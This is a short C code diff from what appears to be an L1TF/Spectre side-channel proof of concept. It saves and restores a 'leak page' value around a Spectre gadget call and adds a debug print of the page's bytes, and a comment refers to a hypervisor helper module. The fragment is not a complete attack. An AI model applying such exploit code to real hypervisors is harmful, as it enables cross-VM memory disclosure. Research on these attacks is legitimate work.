@@ -157,10 +157,11 @@ size_t find_min(void *buf) {
 }
 
 void cmd_determine(void *leak_page) {
+  uint64_t old_page_value = *(uint64_t *)leak_page;
   *(uint64_t *)leak_page = page_value;
   getchar();
   access_buffer_with_spectre(leak_page, 1, 1);
-  *(uint64_t *)leak_page = 0;
+  *(uint64_t *)leak_page = old_page_value;
 }
 
 void cmd_calc_min(int argc, char *argv[argc]) {
@@ -267,6 +268,11 @@ int main(int argc, char *argv[argc]) {
   pin_cpu();
 
   void *leak_page = l1tf_spawn_leak_page();
+  printf("Spawned leak page: ");
+  for (size_t i = 0; i < 8; ++i) {
+    printf("%02x ", ((unsigned char *)leak_page)[i]);
+  }
+  printf("\n");
 
   // Use this to get physical address of the leak page with the
   // kvm_assist.ko module in the hypervisor
